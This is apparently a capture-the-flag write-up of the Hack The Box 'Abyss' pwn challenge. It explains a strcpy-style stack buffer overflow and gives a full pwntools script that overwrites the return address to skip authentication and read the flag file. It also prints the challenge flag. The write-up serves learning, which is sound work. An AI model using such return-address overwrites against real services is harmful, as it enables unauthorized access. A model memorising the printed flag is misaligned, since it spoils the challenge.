# HTB — Abyss

**Category:** Pwn  
**Difficulty:** Easy  
**Platform:** Hack The Box  
**Target:** `154.57.164.67:32600`  
**Tools:** Python 3 · Pwntools · Docker · Linux

---

## 1. Challenge Overview

Abyss is a binary exploitation challenge involving a vulnerable login mechanism. The application provides two commands, `LOGIN` and `READ`, and requires authentication before allowing access to files.

The objective was to examine the program's input handling, identify a memory corruption vulnerability, and exploit it to retrieve the flag from the remote service.

## 2. Initial Analysis

The application uses two commands:

- **LOGIN:** Accepts username and password input.
- **READ:** Reads a specified file and sends its contents back through the connection.

The credentials are randomly generated on the server, making it impractical to guess them.

Instead of recovering the credentials, the vulnerability in the login mechanism provides another way to reach the file-reading functionality.

## 3. Vulnerability Identified

The login routine uses fixed-size stack buffers to process user input.

The program copies input using a `strcpy`-style operation without properly ensuring that the source is null-terminated or that the destination has sufficient space.

This creates a **stack-based buffer overflow**.

The relevant stack layout is:

```text
[ buf ][ user ][ pass ][ return address ]
```

By carefully controlling the input length, data can extend beyond the intended buffer boundaries and overwrite the saved return address.

## 4. Exploitation Approach

The objective was to redirect program execution to the `cmd_read()` function, bypassing the normal authentication check.

The challenge binary does not use PIE, allowing the function address to remain predictable.

The exploit uses the address:

```text
0x4014eb
```

This address points to an instruction inside `cmd_read()` after the authentication check.

### Exploit script

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

p = remote("154.57.164.67", 32600)

# Initial input
p.send(p32(0))
p.recvrepeat(1)

# Crafted username payload
payload = (
    b"USER "
    + b"AAAAAAAABBBBBBBBC\x1cDDDDEEEEEEE"
    + p32(0x4014eb)
)

p.send(payload)
p.recvrepeat(1)

# Password buffer overflow
p.send(b"PASS " + b"D" * (512 - 5))
p.recvrepeat(1)

# Request the flag file
p.send(b"/app/flag.txt")

p.interactive()
```

## 5. Execution Environment

Pwntools initially failed to install on macOS because its Unicorn dependency encountered a compilation error.

To avoid the dependency issue, I used Docker to run Kali Linux and installed Pwntools inside the container.

```bash
docker run --rm -it \
-v "$PWD":/work \
-w /work \
kalilinux/kali-rolling bash
```

Inside Kali:

```bash
apt update
apt install -y python3-pwntools
```

Execute the exploit:

```bash
python3 solve.py
```

## 6. Result — Flag Retrieved

The exploit successfully connected to the remote service, redirected execution to the file-reading function, and retrieved the contents of `/app/flag.txt`.

```text
HTB{sH0u1D_h4v3-NU11-t3rmIn4tEd_buf!_c5a6ad3aafbea44d7af20e27a683edcc}
```

## 7. Key Takeaways

- Identifying unsafe string-copying operations.
- Understanding stack memory layout.
- Recognizing stack-based buffer overflows.
- Learning how an overwritten return address affects program execution.
- Understanding the impact of missing PIE.
- Using Pwntools to automate a remote binary exploit.
- Running Linux security tools through Docker on macOS.

---

**Challenge Status:** Solved  
**Category:** Binary Exploitation / Pwn
